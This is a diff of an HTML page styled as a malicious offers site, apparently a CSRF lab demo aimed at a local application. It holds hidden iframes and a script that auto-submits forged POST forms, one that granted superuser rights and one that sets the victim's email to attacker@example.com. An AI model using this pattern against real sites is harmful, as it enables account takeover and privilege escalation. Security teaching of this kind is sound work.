@@ -10,14 +10,15 @@
     <h1>欢迎访问恶意网站</h1>
     <p>请查看我们的最新优惠！</p>
 
+    <iframe id="iframe-email" style="display:none;"></iframe>
     <iframe id="iframe-superuser" style="display:none;"></iframe>    
     
-    <form id="csrf-form-superuser" method="post" action="http://127.0.0.1:8000/grant_superuser/" target="iframe-superuser">
-        <input type="hidden" name="superuser" value="true">
+    <form id="csrf-form-email" method="post" action="http://127.0.0.1:8000/users/update_profile/" target="iframe-email">
+        <input type="hidden" name="email" value="attacker@example.com">
     </form>
     
     <script>
-        document.getElementById('csrf-form-superuser').submit();
+        document.getElementById('csrf-form-email').submit();
     </script>
     
 </body>
